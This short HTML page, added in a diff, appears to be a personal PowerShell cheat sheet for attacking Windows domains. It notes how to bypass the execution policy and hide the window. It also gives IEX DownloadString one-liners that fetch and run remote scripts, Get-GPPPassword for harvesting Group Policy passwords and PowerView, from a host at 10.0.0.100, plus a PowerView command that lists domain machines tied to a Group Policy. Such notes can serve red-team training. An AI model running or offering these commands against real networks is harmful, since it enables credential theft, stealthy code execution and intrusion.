@@ -1,0 +1,15 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Powershell</title>
+</head><body>Set-ExecutionPolicy -Bypass						Bypass the exeuction policy<br/>
+-WindowStyle Hidden							Hide!<br/>
+<br/>
+Invoke-Expression (IEX) cmdlet, we can load locally-hosted scripts directly into memory EX:<br/>
+IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.0.0.100/Get-GPPPassword.ps1&quot;)<br/>
+IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.0.0.100/powerview.ps1&quot;)<br/>
+<br/>
+<br/>
+PowerView’s Get-NetOU command with the GUID argument to return all Organizational Unit(s) (OU) that are linked to the Group Policy. Piping those results into the Get-NetComputer command will list out all Domain machines tied to the OU(s):<br/>
+<br/>
+Get-NetOU -GUID &quot;{4C86DD57-4040-41CD-B163-58F208A26623}&quot; | %{ Get-NetComputer -ADSPath $_ }</body></html>
